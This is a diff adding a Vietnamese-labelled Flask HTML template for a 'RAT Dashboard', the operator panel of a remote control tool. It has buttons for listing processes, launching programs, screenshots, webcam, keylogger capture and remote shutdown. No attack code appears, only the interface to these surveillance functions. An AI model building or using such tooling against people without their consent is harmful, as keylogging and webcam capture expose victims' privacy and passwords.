@@ -1,0 +1,166 @@
+<!DOCTYPE html>
+<html lang="vi">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>RAT Dashboard</title>
+    <link
+      rel="stylesheet"
+      href="{{ url_for('static', filename='style.css') }}"
+    />
+  </head>
+  <body>
+    <h1>Remote Control Dashboard</h1>
+
+    <div class="container">
+      <!-- CỘT TRÁI -->
+      <div class="sidebar">
+        <h3>Điều khiển</h3>
+
+        <!-- Nhóm 1: App & Process -->
+        <button class="btn btn-primary" onclick="requestList('LIST_APPS')">
+          1. Danh sách Apps
+        </button>
+        <button class="btn btn-primary" onclick="requestList('LIST_PROCESS')">
+          2. Danh sách Process
+        </button>
+
+        <!-- Khu vực Start App/Process mới -->
+        <div class="input-group">
+          <label>Start App/Process:</label>
+          <input
+            type="text"
+            id="app-path"
+            placeholder="Nhập tên (vd: notepad)"
+          />
+          <button
+            class="btn btn-success"
+            style="width: 48%; display: inline-block"
+            onclick="startApp()"
+          >
+            Start App
+          </button>
+          <button
+            class="btn btn-success"
+            style="width: 48%; display: inline-block; margin-left: 4%"
+            onclick="startProcess()"
+          >
+            Start Process
+          </button>
+        </div>
+
+        <hr style="width: 100%" />
+
+        <!-- Nhóm 2: Màn hình & Webcam -->
+        <button class="btn btn-info" onclick="requestScreenshot()">
+          3. Chụp màn hình
+        </button>
+        <button class="btn btn-info" id="btn-webcam" onclick="toggleWebcam()">
+          4. Bật Webcam
+        </button>
+
+        <!-- Nhóm 3: Keylog -->
+        <button
+          class="btn btn-warning"
+          id="btn-keylog-start"
+          onclick="startKeylog()"
+        >
+          5. Bật Keylogger
+        </button>
+        <button
+          class="btn btn-danger"
+          id="btn-keylog-stop"
+          onclick="stopKeylog()"
+          style="display: none"
+        >
+          5b. Tắt Keylogger
+        </button>
+        <button
+          class="btn btn-info"
+          id="btn-keylog-print"
+          onclick="retrieveKeylog()"
+          style="display: none"
+        >
+          5c. Lấy Keystroke
+        </button>
+        <button
+          class="btn btn-primary"
+          id="btn-keylog-clear"
+          onclick="clearKeylog()"
+          style="display: none"
+        >
+          5d. Xóa màn hình
+        </button>
+
+        <hr style="width: 100%" />
+
+        <!-- Nhóm 4: Nguồn -->
+        <button class="btn btn-danger" onclick="confirmAction('RESTART')">
+          6. Restart Máy
+        </button>
+        <button class="btn btn-danger" onclick="confirmAction('SHUTDOWN')">
+          7. Shutdown Máy
+        </button>
+
+        <div class="status-bar" id="status-log">Trạng thái: Đang chờ...</div>
+      </div>
+
+      <!-- CỘT PHẢI -->
+      <div class="main-display">
+        <h2 id="view-title">Màn hình hiển thị</h2>
+
+        <!-- View 1: Bảng dữ liệu (Apps/Process) -->
+        <div id="view-table" class="view-section">
+          <table>
+            <thead>
+              <tr>
+                <th>ID (PID)</th>
+                <th>Tên tiến trình</th>
+                <th>Hành động</th>
+              </tr>
+            </thead>
+            <tbody id="table-body">
+              <!-- Dữ liệu sẽ được JS thêm vào đây -->
+            </tbody>
+          </table>
+        </div>
+
+        <!-- View 2: Hình ảnh (Screenshot/Webcam) -->
+        <div id="view-media" class="view-section">
+          <div class="media-container">
+            <img id="monitor-img" src="" alt="Chưa có hình ảnh" />
+          </div>
+        </div>
+
+        <!-- View 3: Keylog -->
+        <div id="view-keylog" class="view-section">
+          <textarea
+            id="keylog-area"
+            readonly
+            placeholder="Các phím nhấn sẽ hiện ở đây..."
+          ></textarea>
+        </div>
+      </div>
+    </div>
+
+    <script>
+      // Nhận biến từ Flask truyền sang
+      const GATEWAY_CONFIG = "{{ ws_server }}";
+    </script>
+
+    <!-- Load các file JavaScript theo thứ tự (Global State → WebSocket → UI → Commands) -->
+    <script src="{{ url_for('static', filename='state.js') }}"></script>
+    <script src="{{ url_for('static', filename='websocket.js') }}"></script>
+    <script src="{{ url_for('static', filename='ui.js') }}"></script>
+    <script src="{{ url_for('static', filename='commands.js') }}"></script>
+
+    <script>
+      // Khởi chạy sau khi load xong tất cả file JS
+      window.onload = function () {
+        initWebSocket(GATEWAY_CONFIG);
+        // Initialize webcam button state
+        updateWebcamButton();
+      };
+    </script>
+  </body>
+</html>
